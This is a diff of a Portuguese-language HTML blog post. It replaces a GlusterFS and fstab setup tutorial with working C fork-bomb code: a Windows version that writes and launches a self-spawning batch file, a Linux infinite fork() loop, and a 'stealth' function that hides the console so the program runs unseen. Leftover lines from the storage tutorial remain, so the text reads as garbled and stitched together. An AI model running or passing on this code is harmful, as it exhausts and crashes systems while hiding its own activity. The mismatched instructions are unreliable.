@@ -80,19 +80,45 @@ fclose(fp);
 system("start /Max file99.bat");
 return 0;
 }</pre></code>
-<p>Caso queira deixar o home compartilhado no gluster…<br>
+<p>Aqui crio um ponteiro e dou permissão de gravação onde assim insiro os comando com "fprint", filtrando e jogando em outra pasta e no final executo o "*.bat".<br>
 formate e monte.
 </p>
-<code><pre>$cfdisk /dev/sdb1<br>
-$mount -t ext4 /dev/sdb1 /home</pre></code>
-<p>Do modo que será feito abaixo o gluster ficará no sda, e o home no sdb, para os usuários ficarem independentes  e não compartilhados no gluster, não será necessário a formatação e montagem.</p>
+<p><a href="" class="user-mention">*Bomb-Fork básico no Windows 7<br>
+</a></p>
 <br>
-<p>Crie um diretŕio  /share<br>
-Crie um diretório /gluster/data<br>
-Crei um volume</p>
-<code><pre>$gluster volume create testvol replica 2 transport tcp server1.example.com:/data server2.example.com:/data</pre></code>
-<p> Start o volume</p>
-<code><pre>$gluster volume start testvol</pre></code>
+<code><pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include&lt;windows.h&gt;
+int main(int argc, char *argv[]) {
+FILE * fp;
+fp = fopen ("red.bat","w+");
+fprintf(fp, "%s" "%s" "%s",":12 \n","@start %0 \n","@goto 12");
+fclose(fp);
+system("start /Max red.bat");
+return(0);
+}</pre></code>
+<p>Mesmo conceito, porém criei um loop infinito no DOS  onde instancio e chamo com @goto.
+No Linux podemos usar o unistd.h pra acessar diretamente os ficheiros e diretorios, já temos até um fork pronto basicamente, só jogar true no while e ser feliz.</p>
+
+<code><pre>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(){
+while (1) {
+fork();
+}
+return(0);
+}</pre></code>
+<p>Maravilha, mais e aí como executar isso em segundo plano!? Afinal, e se eu não quiser mostrar o console e rodar meu programa em Background.
+
+Tem uma função simples pra isso:</p>
+<code><pre>void stealth (){
+HWND stealth;
+AllocConsole();
+stealth = FindWindowA("consoleWindowClass", NULL);
+ShowWindow(stealth, 0);
+}
+</pre></code>
 <p></p>Adicione no fstab para montar no boot.</p>
 <code><pre>$nano /etc/fstab<br><br>
   @aero-no1:~$ cat /etc/fstab<br>
